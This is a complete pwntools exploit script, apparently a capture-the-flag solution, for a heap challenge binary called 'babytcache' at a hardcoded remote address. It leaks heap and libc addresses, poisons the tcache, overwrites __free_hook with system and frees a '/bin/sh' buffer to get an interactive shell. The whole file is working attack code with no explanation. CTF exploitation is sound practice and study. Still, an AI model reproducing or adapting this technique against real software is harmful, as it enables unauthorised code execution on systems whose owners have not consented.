#!/usr/bin/env python2

from pwn import *

BINARY = './babytcache'
HOST, PORT = '51.158.118.84', 17002

elf = ELF(BINARY)
libc = ELF('./libc.so.6')

def start():
	if not args.REMOTE:
		print "LOCAL PROCESS"
		return process(BINARY)
	else:
		print "REMOTE PROCESS"
		return remote(HOST, PORT)

def get_base_address(proc):
	return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(p)
    script += "set $_base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    gdb.attach(p,gdbscript=script)


def add(idx, size, data):
	p.sendlineafter('>> ', '1')
	p.sendlineafter(':\n', str(idx))
	p.sendlineafter(':\n', str(size))
	p.sendafter(':\n', data)

def edit(idx, data):
	p.sendlineafter('>> ', '2')
	p.sendlineafter(':\n', str(idx))
	p.sendlineafter(':\n', data)

def free(idx):
	p.sendlineafter('>> ', '3')
	p.sendlineafter(':\n', str(idx))

def show(idx):
	p.sendlineafter('>> ', '4')
	p.sendlineafter(':\n', str(idx))

context.arch = 'amd64'
context.terminal = ['tmux', 'new-window']

p = start()
if args.GDB:
	debug([])

add(0, 0x80, 'A'*0x80) # Used for heap leak
add(1, 0x80, 'A'*0x80) # Used for libc leak
add(2, 0x80, 'A'*0x80) # Prevent consolidation with top
free(0)
free(0)
show(0)

heap = u64(p.recvline().split(':')[1].strip().ljust(8, '\x00')) - 0x260
log.info('Heap base: ' + hex(heap))

# Tcache poisoning attack
edit(0, p64(heap+0x10))
add(3, 0x80, 'A'*0x80)
add(4, 0x80, p64(0x0700000000000000))

# Leak libc
free(1)
show(1)

libc.address = u64(p.recvline().split(':')[1].strip().ljust(8, '\x00')) - 0x3ebca0
log.info('Libc base: ' + hex(libc.address))

edit(4, '\x00'*0x78 + p64(libc.sym['__free_hook']))
add(5, 0x80, p64(libc.sym['system']))

edit(0, '/bin/sh\x00')
free(0)

p.interactive()
